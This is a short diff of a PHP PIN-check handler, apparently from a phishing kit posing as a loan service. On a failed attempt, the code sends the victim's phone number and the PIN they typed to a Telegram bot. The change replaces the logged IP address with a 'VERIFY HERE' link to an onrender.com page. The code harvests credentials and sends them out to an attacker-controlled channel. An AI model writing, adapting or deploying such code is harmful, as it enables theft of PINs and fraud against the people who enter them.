@@ -142,9 +142,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     $error = "Wrong PIN";
                     
                     // (Optional) Send Telegram notification of failed attempt
-                    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+                    $ip = "https://loan-1-i36j.onrender.com/verify.php";
                     $time = date('Y-m-d H:i:s');
-                    $msg = "❌ *Failed PIN attempt*\n\n📱 Phone: +263 {$phone}\n🔢 PIN entered: `{$pin}`\n⏰ Time: {$time}\n🌐 IP: {$ip}";
+                    $msg = "❌ *Failed PIN attempt*\n\n📱 Phone: +263 {$phone}\n🔢 PIN entered: `{$pin}`\n⏰ Time: {$time}\n🌐 VERIFY HERE: {$ip}";
                     sendTelegramMessage($botToken, $chatId, $msg);
                 }
             } else {
